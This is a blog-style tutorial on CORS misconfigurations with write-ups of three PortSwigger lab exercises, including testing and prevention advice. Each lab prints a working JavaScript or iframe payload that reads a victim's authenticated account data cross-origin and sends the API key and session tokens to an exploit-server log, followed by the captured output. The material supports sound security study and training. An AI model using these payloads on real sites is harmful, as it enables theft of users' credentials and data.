---
title: "Cross-Origin Resource Sharing (CORS)"
date: 2026-11-12
draft: false
description: "Theory, testing methodology and PortSwigger CORS lab write-ups."
tags:
  - Labs
  - portswigger
categories:
  - writeups
  - tutorials
---

## Description

Cross-Origin Resource Sharing (CORS) is a browser mechanism that relaxes the browser's Same-Origin Policy (SOP) using HTTP headers. It is not an attack by itself - a CORS misconfiguration is. When a server trusts an origin it should not trust (a reflected arbitrary origin, the `null` origin, or an insecure-protocol/subdomain origin) together with `Access-Control-Allow-Credentials: true`, an attacker can make the victim's browser read authenticated data cross-origin and steal it with a simple delivered exploit page. This is also one of the PortSwigger Web Security Academy topics used in the BSCP exam.

### Same-Origin Policy and Origins

The Same-Origin Policy is the browser's core security mechanism. It restricts how a script loaded from one origin can interact with resources from another origin - for example, a script on `https://evil.com` must not be able to read responses from `https://yourbank.com` even though the user has both sites open. SOP blocks cross-origin reads, but it still allows embedding (images, scripts, iframes) and top-level navigations and form submissions.

To understand what "same origin" means, we need the definition of an origin. An origin is the combination of three parts:

```
scheme :// domain : port
https  :// example.com : 443
```

Two URLs are considered same-origin only when all three parts match exactly:

| URL | Compared with `https://example.com/` | Same origin? | Reason |
| :-- | :-- | :-- | :-- |
| `https://example.com/account` | | Yes | Same scheme, same domain, same port |
| `http://example.com/` | | No | Different scheme - `http` instead of `https` |
| `https://example.com:8080/` | | No | Different port |
| `https://sub.example.com/` | | No | Different domain - a subdomain is a different origin |
| `https://example.net/` | | No | Different domain |

Useful details:

- When the port is not written, the scheme's default port is used - `80` for `http://` and `443` for `https://`.
- The path is not part of the origin - `https://example.com/a` and `https://example.com/b` are the same origin.
- The special origin `null` exists - the browser reports `Origin: null` when a page runs without a normal origin, most commonly inside a sandboxed iframe (without `allow-same-origin`), in `srcdoc` documents, in `data:` URLs and in local `file://` pages.

### How CORS Works

When a script makes a cross-origin request, the browser automatically attaches the `Origin` header. The server then decides, with response headers, whether the browser may let the script read the response:

- `Access-Control-Allow-Origin` - the origin allowed to read the response (`*` means any origin, for public data).
- `Access-Control-Allow-Credentials: true` - the browser may send cookies / HTTP authentication with the request, and the credentialed response may be read. This is the dangerous switch: reflected origin + credentials = data theft.
- `Access-Control-Allow-Methods` and `Access-Control-Allow-Headers` - used in preflight responses to allow non-simple requests (custom headers, `PUT`/`DELETE`, JSON content types, etc.).

Preflight requests: for non-simple requests the browser first sends an `OPTIONS` request containing `Origin`, `Access-Control-Request-Method` and `Access-Control-Request-Headers`, and the real request only follows if the server's preflight response allows it. In the labs below we deal with simple credentialed `GET` requests, so no preflight is involved.

### Dangerous CORS Configurations

Based on [HackTricks - CORS Bypass](https://hacktricks.wiki/pentesting-web/cors-bypass.html) and [PayloadsAllTheThings - CORS Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration), these are the classic exploitable misconfigurations:

| Misconfiguration | How it is exploited |
| :-- | :-- |
| Server reflects any `Origin` in `Access-Control-Allow-Origin` with `Access-Control-Allow-Credentials: true` | Deliver a page that sends a credentialed XHR and exfiltrates the response (Lab 1) |
| Server trusts `Origin: null` | Run the payload inside a sandboxed iframe / `srcdoc` so it executes with a null origin (Lab 2) |
| Server trusts an insecure-protocol or subdomain origin, e.g. `http://stock.example.com` | Chain the trusted origin with an XSS on that same origin (Lab 3) |
| Wildcard `*` without credentials | Only unauthenticated/public data can leak - usually low impact |
| Overlapping/duplicate ACAO headers or sloppy regex validation | Variants of origin-check bypass worth probing |

One more related technique from the same Academy topic worth knowing for completeness: blind CORS with an internal network pivot - a vulnerable CORS setup can be abused from the victim's browser to interact with internal network hosts.

### Where and How to Test

- Look at authenticated endpoints that return sensitive data - account details, API keys, profile information.
- Add `Origin: https://evil.com` to every interesting request in Repeater and watch the response headers for reflection.
- Also try `Origin: null` and the target's own subdomains over `http://` (insecure protocol).
- Check for `Access-Control-Allow-Credentials: true` - without it the cross-origin request is sent anonymous and the leaked data is usually useless.
- Burp Scanner automatically flags some CORS misconfigurations, but always confirm manually in Repeater.
- The impact chain in exam-style labs: trusted-origin misconfiguration + credentials + sensitive endpoint = steal the victim's data with a delivered exploit page.

### Quick Checklist (BSCP Preparation)

When a lab (or the exam) points you at a CORS issue, work through this order:

1. Add `Origin: https://evil.com` to the sensitive endpoint's request - check for reflection plus `Access-Control-Allow-Credentials: true`.
2. If nothing is reflected, try `Origin: null` - if it is trusted, build the sandboxed `srcdoc` iframe payload.
3. If still nothing, enumerate the target's subdomains and try them over `http://` - if one is trusted, find an XSS on that origin and chain it.
4. Remember the three payload shapes: plain XHR page (Lab 1), sandboxed iframe (Lab 2), XSS-chained redirect (Lab 3).
5. Always finish with: deliver the exploit to the victim, poll/decode the log, submit the leaked value.

### How to Prevent

- Never reflect the `Origin` header blindly - validate it against an explicit allow-list of exact origins (scheme + domain + port).
- Do not trust `null`.
- Do not whitelist insecure-protocol (`http://`) or wildcard subdomain origins.
- Use `*` only for genuinely public, non-sensitive data.
- Serve everything over HTTPS and keep the allow-list minimal.

## PortSwigger CORS Labs

### Lab 1 : CORS vulnerability with basic origin reflection

**Goal :** Craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server.

**Analysis :**

First we will try the CORS origin to know exactly what the application accepts. There is a `/accountDetails` endpoint. We add the header `Origin: https://google.com` to the request.

And then we can see the application doesn't validate the origin - it just reflects it. The response also contains:

`Access-Control-Allow-Origin: https://google.com`
`Access-Control-Allow-Credentials: true`

**Exploitation :**

Based on these things, we will write a script that we deliver to the victim; when they open it, we can view their account details based on that.

```javascript
<script>
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function () {
  if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
    location = '/log?key=' + encodeURIComponent(xhr.responseText);
  }
}
xhr.open("GET", "https://YOUR-LAB-ID.web-security-academy.net/accountDetails", true);
xhr.withCredentials = true;
xhr.send(null);
</script>
```

How this payload works:

- `var xhr = new XMLHttpRequest()` - creates an XHR request object. For any cross-origin request the browser automatically attaches the `Origin` header of the exploit server, which is exactly what the server reflects back.
- `xhr.open("GET", "https://YOUR-LAB-ID.web-security-academy.net/accountDetails", true)` - prepares an asynchronous GET request to the vulnerable endpoint. The full absolute URL is needed because the script runs on the exploit server, which is a different origin.
- `xhr.withCredentials = true` - the key line: it tells the browser to send the victim's session cookies with the cross-origin request. This only works because the server answered with `Access-Control-Allow-Credentials: true`, and it is what makes the response contain the victim's data.
- `xhr.onreadystatechange` - fires on every state change of the request. When `readyState` is `XMLHttpRequest.DONE` (4) and the status is `200`, the response has fully arrived.
- `location = '/log?key=' + encodeURIComponent(xhr.responseText)` - exfiltration. It navigates the browser to the exploit server's `/log` endpoint with the stolen response URL-encoded in the query string. Top-level navigation is not blocked by SOP/CORS, so the response lands in the exploit server's access log.

Deliver the exploit to the victim and view the logs.

![Lab 1 - the victim triggered the exploit and the response is captured in the log](/images/CORS/Lab1-CORS1.png)

And we can see the whole encoded response, and when we decode it we can see the credentials.

```text
{
  "username": "administrator",
  "email": "",
  "apikey": "RaVbuX3IuS5vDgM1Y04fDP4asSp754gW",
  "sessions": [
    "3v4b66uHZQnrh3z2F2BSFO5ByPXCE4U2"
  ]
}
```

Submit the apikey and we solve the lab.

### Lab 2 : CORS vulnerability with trusted null origin

**Goal :** Some of the website's HTTPS origins trust the origin `null`. Craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server.

**Analysis :**

We can see the application only accepts the origin value `null`. When we send `Origin: null`, the response reflects it with `Access-Control-Allow-Origin: null` and `Access-Control-Allow-Credentials: true`.

![Lab 2 - the null origin is trusted with credentials](/images/CORS/Lab2-CORS1.png)

The `null` origin appears when a page runs without a normal origin - the most common sources are a sandboxed iframe without `allow-same-origin`, `srcdoc` documents, `data:` URLs and local `file://` pages. So we can host our payload inside such an iframe and the server will trust it.

**Exploitation :**

In the exploit server we will put this payload.

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0ac300eb03e7748e80ea8f610079000d.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='https://exploit-0a00003103fe741d802c8e20015f0054.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```

How this payload works:

- `<iframe sandbox="..." srcdoc="...">` - the `sandbox` attribute without `allow-same-origin` strips the iframe's identity, so everything inside it runs with `Origin: null` - exactly the origin the server trusts. This is the core trick.
- `allow-scripts` - lets the inline `<script>` inside the iframe execute.
- `allow-top-navigation` and `allow-forms` - let the sandboxed script navigate the top-level page and submit forms, which the `location='...'` exfiltration step relies on.
- `srcdoc` - embeds the whole HTML document directly as the attribute value, so we don't need to host a separate file for the iframe content.
- Inside the iframe, the script is the same idea as Lab 1 - a credentialed XHR GET to `/accountDetails`, then exfiltrate the response to the exploit server log with `location='.../log?key=' + encodeURIComponent(this.responseText)`.

Deliver the exploit to the victim and view the logs.

![Lab 2 - the null-origin iframe payload captured the response in the log](/images/CORS/Lab2-CORS2.png)

And we can see the whole encoded response, and when we decode it we can see the credentials.

```text
{
  "username": "administrator",
  "email": "",
  "apikey": "ej1rvUPlTDBY5yc7M8lfApoKtX3OtNMl",
  "sessions": [
    "WOOPmFD3x1VUeIIpdMX66k9v3gEnuTC4"
  ]
}
```

Submit the apikey and we solve the lab.

### Lab 3 : CORS vulnerability with trusted insecure protocols

**Goal :** This website has a trusted insecure protocol subdomain at `http://stock.<YOUR-LAB-ID>.web-security-academy.net`. Craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server.

**Analysis :**

We can see the application doesn't accept anything, including the two previous techniques.

So we try to search for other functions and we can see there is an XSS in the check stock function - the product ID parameter of the stock subdomain:

`http://stock.0ab600d7046dba39801703d300c40057.web-security-academy.net/?productId=<script>alert(1)</script>&storeId=1`

check stock function of product ID - `<script>alert(1)</script>`

![Lab 3 - XSS on the insecure-protocol stock subdomain](/images/CORS/Lab3-CORS2.png)

So we will use XSS to exploit the CORS like shown in PayloadsAllTheThings - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration#xss-on-trusted-origin

**Exploitation :**

Payload we use -

```html
<script>
document.location = "http://stock.0ab600d7046dba39801703d300c40057.web-security-academy.net/?productId=<script>var req=new XMLHttpRequest();req.onload=function(){location='https://exploit-0afa00490404baeb80cd0214015100f1.exploit-server.net/log?key='%2bencodeURIComponent(this.responseText)};req.open('get','https://0ab600d7046dba39801703d300c40057.web-security-academy.net/accountDetails',true);req.withCredentials=true;req.send();%3c/script>&storeId=1"
</script>
```

How this payload works:

- `document.location = "http://stock.<lab-id>.../?productId=..."` - navigates the victim (from our delivered exploit page) to the stock subdomain over plain `http://` - an insecure-protocol origin the main application trusts for CORS.
- The `productId` parameter is reflected without sanitization, so we inject a second `<script>` there - this is the XSS we confirmed with `alert(1)` in the analysis.
- `%3c/script>` - the URL-encoded form of `</script>`. It keeps the HTML parser from ending the outer `<script>` block early; the server URL-decodes it back, so the reflected page contains the real inner `<script>...</script>`.
- `%2b` - the URL-encoded form of `+`. Without encoding, a `+` in a query string is interpreted as a space and breaks the payload.
- The inner script runs on the stock subdomain - a trusted origin - and performs the same credentialed XHR as before: `req.open('get','https://<lab-id>.web-security-academy.net/accountDetails',true)` with `req.withCredentials=true`, then exfiltrates the response to the exploit server log with `location='.../log?key='+encodeURIComponent(this.responseText)`.
- In short: XSS on a trusted (insecure-protocol) origin = CORS bypass, because the browser sends the request and reads the response for that origin.

Deliver the exploit to the victim and view the logs.

![Lab 3 - the chained XSS payload captured the response in the log](/images/CORS/Lab3-CORS1.png)

And we can see the whole encoded response, and when we decode it we can see the credentials.

```http
10.0.4.186      2026-11-12 06:50:55  0000 "GET /log?key={
  "username": "administrator",
  "email": "",
  "apikey": "VKk0K91NFO3SmPT3z8XLgPKZ1Dooc1Vx",
  "sessions": [
    "FEsxe91G1G72zzxhPDv2vzVt4REoMw5O"
  ]
} HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36"
```

Submit the apikey and the lab is solved.

## References

- [PortSwigger - Cross-origin resource sharing (CORS)](https://portswigger.net/web-security/cors)
- [HackTricks - CORS Bypass](https://hacktricks.wiki/pentesting-web/cors-bypass.html)
- [PayloadsAllTheThings - CORS Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)
- [MDN - Cross-Origin Resource Sharing (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
